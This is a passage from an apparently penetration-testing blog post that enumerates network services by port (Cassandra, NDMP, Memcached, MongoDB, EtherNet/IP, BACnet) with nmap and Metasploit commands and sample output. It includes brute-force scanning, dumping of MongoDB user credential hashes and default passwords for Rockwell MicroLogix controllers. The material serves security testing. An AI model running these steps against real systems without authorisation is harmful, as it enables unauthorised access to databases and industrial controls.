<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 9160 10.10.xx.xx -n &ndash;script=cassandra-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 21:14 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.16s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9160/tcp open  cassandra
</span><span class='line'>| cassandra-info:
</span><span class='line'>|   Cluster name: Convoy
</span><span class='line'>|_  Version: 19.20.0</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><a href="https://nmap.org/nsedoc/scripts/cassandra-brute.html">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 9160 122.166.xx.xx -n &ndash;script=cassandra-brute
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 21:19 IST
</span><span class='line'>Nmap scan report for 122.166.xx.xx
</span><span class='line'>Host is up (0.083s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9160/tcp open  apani1
</span><span class='line'>|_cassandra-brute: Any username and password would do, &lsquo;default&rsquo; was used to test</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>Network Data Management Protocol (ndmp) | Port 10000</h3>

<p><strong>Nmap NSE</strong> has
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html">ndmp-fs-info</a> can be used to list remote file systems
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -s ndmp -p 10000
</span><span class='line'>services -p 10000 -s ndmp -o /tmp/ndmp.ports
</span><span class='line'>cat /tmp/ndmp.ports | cut -d , -f1 | tr -d \&ldquo; | grep -v host &gt; /tmp/ndmp.ports.2</span></code></pre></td></tr></table></div></figure>
Pass this to nmap
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 10000 &ndash;script ndmp-fs-info -n -iL /tmp/ndmp.ports.2</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>| ndmp-fs-info:
</span><span class='line'>| FS       Logical device             Physical device
</span><span class='line'>| NTFS     C:                         Device0000
</span><span class='line'>| NTFS     D:                         Device0000
</span><span class='line'>| NTFS     E:                         Device0000
</span><span class='line'>| RMAN     Oracle-Win::\TRDPLM\WIND  Device0000
</span><span class='line'>| UNKNOWN  Shadow Copy Components     Device0000
</span><span class='line'>|_UNKNOWN  System State               Device0000
</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-version.html">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to &ndash;script-trace we do find the versions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00               <br/>
</span><span class='line'>00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
</span><span class='line'>00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.   <br/>
</span><span class='line'>00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
</span><span class='line'>00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3   <br/>
</span><span class='line'>00000060: 00 00 00 be 00 00 00 05 00 00 00 04                       <br/>
</span><span class='line'>
</span><span class='line'>NSOCK INFO [5.0650s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 1122 [10.10.xx.xx:10000] (108 bytes)
</span><span class='line'>NSE: TCP 10.10.xx.xx:40435 &lt; 10.10.9.12:10000 | 00000000: 80 00 00 68 00 00 00 03 56 f1 64 e7 00 00 00 01    h    V d   <br/>
</span><span class='line'>00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00               <br/>
</span><span class='line'>00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
</span><span class='line'>00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.   <br/>
</span><span class='line'>00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
</span><span class='line'>00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3  </span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>Memcache | Port 11211</h3>

<p>Memcached is a free &amp; open source, high-performance, distributed memory object caching system.</p>

<p>There&rsquo;s a nmap script
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/memcached-info.html">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 11211 &ndash;script memcached-info 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 02:48 IST
</span><span class='line'>Nmap scan report for email.xxxxxx.com (10.10.xx.xx)
</span><span class='line'>Host is up (0.082s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>11211/tcp open  unknown
</span><span class='line'>| memcached-info:
</span><span class='line'>|   Process ID           4252
</span><span class='line'>|   Uptime               1582276 seconds
</span><span class='line'>|   Server time          2016-03-26T21:18:15
</span><span class='line'>|   Architecture         64 bit
</span><span class='line'>|   Used CPU (user)      25.881617
</span><span class='line'>|   Used CPU (system)    17.413088
</span><span class='line'>|   Current connections  14
</span><span class='line'>|   Total connections    41
</span><span class='line'>|   Maximum connections  1024
</span><span class='line'>|   TCP Port             11211
</span><span class='line'>|   UDP Port             11211
</span><span class='line'>|_  Authentication       no
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<p>We can also telnet to this port: Stats is one of the commands
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>telnet 10.10.xx.xx 11211
</span><span class='line'>stats
</span><span class='line'>STAT pid 4252
</span><span class='line'>STAT uptime 1582386
</span><span class='line'>STAT time 1459027205
</span><span class='line'>STAT version 1.4.10
</span><span class='line'>STAT libevent 2.0.16-stable
</span><span class='line'>STAT pointer_size 64
</span><span class='line'>STAT rusage_user 25.889618
</span><span class='line'>STAT rusage_system 17.417088
</span><span class='line'>STAT curr_connections 14
</span><span class='line'>STAT total_connections 42
</span><span class='line'>STAT connection_structures 15
</span><span class='line'>STAT reserved_fds 20
</span><span class='line'>STAT cmd_get 3
</span><span class='line'>STAT cmd_set 3
</span><span class='line'>STAT cmd_flush 0
</span><span class='line'>STAT cmd_touch 0
</span><span class='line'>STAT get_hits 2
</span><span class='line'>STAT get_misses 1
</span><span class='line'>STAT delete_misses 0
</span><span class='line'>STAT delete_hits 0
</span><span class='line'>STAT incr_misses 0
</span><span class='line'>STAT incr_hits 0
</span><span class='line'>STAT decr_misses 0
</span><span class='line'>STAT decr_hits 0
</span><span class='line'>STAT cas_misses 0
</span><span class='line'>STAT cas_hits 0
</span><span class='line'>STAT cas_badval 0
</span><span class='line'>STAT touch_hits 0
</span><span class='line'>STAT touch_misses 0
</span><span class='line'>STAT auth_cmds 0
</span><span class='line'>STAT auth_errors 0
</span><span class='line'>STAT bytes_read 775
</span><span class='line'>STAT bytes_written 26158
</span><span class='line'>STAT limit_maxbytes 67108864
</span><span class='line'>STAT accepting_conns 1
</span><span class='line'>STAT listen_disabled_num 0
</span><span class='line'>STAT threads 4
</span><span class='line'>STAT conn_yields 0
</span><span class='line'>STAT hash_power_level 16
</span><span class='line'>STAT hash_bytes 524288
</span><span class='line'>STAT hash_is_expanding 0
</span><span class='line'>STAT expired_unfetched 0
</span><span class='line'>STAT evicted_unfetched 0
</span><span class='line'>STAT bytes 87
</span><span class='line'>STAT curr_items 1
</span><span class='line'>STAT total_items 1
</span><span class='line'>STAT evictions 0
</span><span class='line'>STAT reclaimed 0
</span><span class='line'>END</span></code></pre></td></tr></table></div></figure></p>

<p>Sensepost has written a tool <a href="https://github.com/sensepost/go-derper">go-derper</a> and a article here <a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">blackhat-write-up-go-derper-and-mining-memcaches</a>  Blackhat slides here <a href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf">BlackHat-AD-2010-Slaviero-Lifting-the-Fog-Slides</a></p>

<h3>MongoDB | Port 27017 and Port 27018</h3>

<p><a href="https://github.com/all3g/exploit-exercises/tree/master/mongodb">mongodb</a> provides a good walkthru how to check for vulns in mongodb;</p>

<p><strong>Metasploit</strong> has</p>

<p><ol>
<li><strong>MongoDB Login Utility</strong>:   This module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank_passwords to true. This can also be checked using the Nmap nse mongodb-brute
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mongodb/mongodb_login</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Scanning IP: 10.169.xx.xx
</span><span class='line'>[+] Mongo server 10.169.xx.xx dosn&rsquo;t use authentication</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p><strong>Nmap</strong> has three NSEs for mongo db databases
<ol>
<li>Mongodb-info:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 10.169.xx.xx -p 27017 -sV &ndash;script mongodb-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:23 IST
</span><span class='line'>Nmap scan report for mongod.example.com (10.169.xx.xx)
</span><span class='line'>Host is up (0.088s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9 2.6.9
</span><span class='line'>| mongodb-info:
</span><span class='line'>|   MongoDB Build info
</span><span class='line'>|     OpenSSLVersion =
</span><span class='line'>|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-function -Wno-deprecated-declarations -fno-builtin-memcmp
</span><span class='line'>|     loaderFlags = -fPIC -pthread -Wl,-z,now -rdynamic
</span><span class='line'>|     version = 2.6.9
</span><span class='line'>|     ok = 1
</span><span class='line'>|     maxBsonObjectSize = 16777216
</span><span class='line'>|     debug = false
</span><span class='line'>|     bits = 64
</span><span class='line'>|     javascriptEngine = V8
</span><span class='line'>|     sysInfo = Linux build20.mongod.example.com 2.6.32-431.3.1.el6.x86_64 #1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
</span><span class='line'>|     versionArray
</span><span class='line'>|       1 = 6
</span><span class='line'>|       2 = 9
</span><span class='line'>|       3 = 0
</span><span class='line'>|       0 = 2
</span><span class='line'>|     allocator = tcmalloc
</span><span class='line'>|     gitVersion = df313bc75aa94d192330cb92756fc486ea604e64
</span><span class='line'>|   Server status
</span><span class='line'>|     opcounters
</span><span class='line'>|       query = 19752
</span><span class='line'>|       update = 1374
</span><span class='line'>|       insert = 71735056
</span><span class='line'>|       command = 78465013
</span><span class='line'>|       delete = 121
</span><span class='line'>|       getmore = 4156
</span><span class='line'>|     connections
</span><span class='line'>|       available = 795
</span><span class='line'>|       totalCreated = 4487
</span><span class='line'>|       current = 24
</span><span class='line'>|     uptimeMillis = 3487298933
</span><span class='line'>|     localTime = 1458938079849
</span><span class='line'>|     metrics
</span><span class='line'>|       getLastError
</span><span class='line'>|         wtime
</span><span class='line'>|           num = 0
</span><span class='line'>|           totalMillis = 0
</span><span class='line'>|     uptimeEstimate = 3455635
</span><span class='line'>|     version = 2.6.9
</span><span class='line'>|     uptime = 3487299
</span><span class='line'>|     network
</span><span class='line'>|       bytesOut = 17159001651
</span><span class='line'>|       numRequests = 78517212
</span><span class='line'>|       bytesIn = 73790966211
</span><span class='line'>|     host = nvt-prod-05
</span><span class='line'>|     mem
</span><span class='line'>|       supported = true
</span><span class='line'>|       virtual = 344
</span><span class='line'>|       resident = 31
</span><span class='line'>|       bits = 64
</span><span class='line'>|     pid = 25964
</span><span class='line'>|     extra_info
</span><span class='line'>|       heap_usage_bytes = 2798848
</span><span class='line'>|       page_faults = 16064
</span><span class='line'>|       note = fields vary by platform
</span><span class='line'>|     asserts
</span><span class='line'>|       warning = 1
</span><span class='line'>|       regular = 1
</span><span class='line'>|       rollovers = 0
</span><span class='line'>|       user = 11344
</span><span class='line'>|       msg = 0
</span><span class='line'>|     process = mongos
</span><span class='line'>|_    ok = 1
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>Mongodb-database to find the databases in the mongodb.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 122.169.xx.xx -p 27017 -sV &ndash;script mongodb-databases.nse
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:23 IST
</span><span class='line'>Nmap scan report for mongod.example.com (10.169.xx.xx)
</span><span class='line'>Host is up (0.090s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9
</span><span class='line'>| mongodb-databases:
</span><span class='line'>|   ok = 1
</span><span class='line'>|   databases
</span><span class='line'>|     1
</span><span class='line'>|       shards
</span><span class='line'>|         rs0 = 1
</span><span class='line'>|       sizeOnDisk = 1
</span><span class='line'>|       empty = true
</span><span class='line'>|       name = test
</span><span class='line'>|     0
</span><span class='line'>|       shards
</span><span class='line'>|         rs0 = 21415067648
</span><span class='line'>|         rs1 = 17122197504
</span><span class='line'>|       sizeOnDisk = 38537265152
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = genprod
</span><span class='line'>|     3
</span><span class='line'>|       sizeOnDisk = 16777216
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = admin
</span><span class='line'>|     2
</span><span class='line'>|       sizeOnDisk = 50331648
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = config
</span><span class='line'>|   totalSize = 38537265153
</span><span class='line'>|_  totalSizeMb = 36752</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>Mongodb-BruteForce
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 10.169.xx.xx -p 27017 -sV &ndash;script mongodb-brute -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:28 IST
</span><span class='line'>Nmap scan report for 122.169.xx.xx
</span><span class='line'>Host is up (0.086s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9
</span><span class='line'>|_mongodb-brute: No authentication needed</span></code></pre></td></tr></table></div></figure></p>

<p>This database can be connected using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongo 10.169.xx.xx
</span><span class='line'>MongoDB shell version: 2.4.10
</span><span class='line'>connecting to: 122.169.xx.xx/test</span></code></pre></td></tr></table></div></figure>
Show DBS can be used to see the current databases;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; show dbs
</span><span class='line'>admin 0.015625GB
</span><span class='line'>config    0.046875GB
</span><span class='line'>genprod   35.890625GB
</span><span class='line'>test  (empty)</span></code></pre></td></tr></table></div></figure>
Use command can be used select the database
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; use admin
</span><span class='line'>switched to db admin</span></code></pre></td></tr></table></div></figure>
Show collections can be used to see the tables;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; show collections
</span><span class='line'>nxae
</span><span class='line'>system.indexes
</span><span class='line'>system.users
</span><span class='line'>system.version</span></code></pre></td></tr></table></div></figure>
db.foo.find()                list objects in collection foo
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db.system.users.find()
</span><span class='line'>{ &ldquo;<em>id&rdquo; : &ldquo;test.root&rdquo;, &ldquo;user&rdquo; : &ldquo;root&rdquo;, &ldquo;db&rdquo; : &ldquo;test&rdquo;, &ldquo;credentials&rdquo; : { &ldquo;MONGODB-CR&rdquo; : &ldquo;d6zzzdb4538zzz339acd585fa9zzzzzz&rdquo; }, &ldquo;roles&rdquo; : [  {  &ldquo;role&rdquo; : &ldquo;dbOwner&rdquo;,  &ldquo;db&rdquo; : &ldquo;test&rdquo; } ] }
</span><span class='line'>{ &ldquo;</em>id&rdquo; : &ldquo;genprod.root&rdquo;, &ldquo;user&rdquo; : &ldquo;root&rdquo;, &ldquo;db&rdquo; : &ldquo;genprod&rdquo;, &ldquo;credentials&rdquo; : { &ldquo;MONGODB-CR&rdquo; : &ldquo;d6zzzdb4538zzz339acd585fa9zzzzzz&rdquo; }, &ldquo;roles&rdquo; : [  {  &ldquo;role&rdquo; : &ldquo;dbOwner&rdquo;,  &ldquo;db&rdquo; : &ldquo;genprod&rdquo; } ] }</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>EthernetIP-TCP-UDP | Port 44818</h3>

<p>If we found TCP Port 44818, probably it&rsquo;s running Ethernet/IP. Rockwell Automation / Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.</p>

<p><a href="https://github.com/digitalbond/Redpoint">Redpoint</a> has released a NSE for enumeration of these devices</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 44818 -n &ndash;script enip-enumerate x.x.x.x -Pn
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-25 18:49 IST
</span><span class='line'>Nmap scan report for x.x.x.x
</span><span class='line'>Host is up (0.83s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>44818/tcp open  EtherNet/IP
</span><span class='line'>| enip-enumerate:
</span><span class='line'>|   Vendor: Rockwell Automation/Allen-Bradley (1)
</span><span class='line'>|   Product Name: 1766-L32BXB B/10.00
</span><span class='line'>|   Serial Number: 0x40605446
</span><span class='line'>|   Device Type: Programmable Logic Controller (14)
</span><span class='line'>|   Product Code: 90
</span><span class='line'>|   Revision: 2.10
</span><span class='line'>|_  Device IP: 192.168.xx.xx</span></code></pre></td></tr></table></div></figure></p>

<p>Rockwell Automation has
<ol>
<li>MicroLogix 1100: Default Username:password is administrator:ml1100</li>
<li>MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf">MicroLogix 1400</a> </li>
<li>guest:guest is another default password.</li>
</ol></p>

<h3>UDP BACNet | Port 47808</h3>

<p>If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a href="https://github.com/digitalbond/Redpoint">Redpoint</a>. Should read <a href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/">Discover Enumerate bacnet devices</a></p>

<p>BACNet &ndash; Port 47808
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 47808 -n -vvv &ndash;script BACnet-discover-enumerate &ndash;script-args full=yes 182.X.X.X
</span><span class='line'>Nmap scan report for 182.X.X.X
</span><span class='line'>Host is up (0.11s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>47808/udp open  BACNet &ndash; Building Automation and Control Networks
</span><span class='line'>| BACnet-discover-enumerate:
</span><span class='line'>|   Vendor ID: Automated Logic Corporation (24)
</span><span class='line'>|   Vendor Name: Automated Logic Corporation
</span><span class='line'>|   Object-identifier: 2404999
</span><span class='line'>|   Firmware: BOOT(id=0,ver=0.01:001,crc=0x0000) MAIN(id=3,ver=6.00a:008,crc=0x2050)
</span><span class='line'>|   Application Software: PRG:carrier_19xrv_chiller_01_er_mv
</span><span class='line'>|   Object Name: device2404999
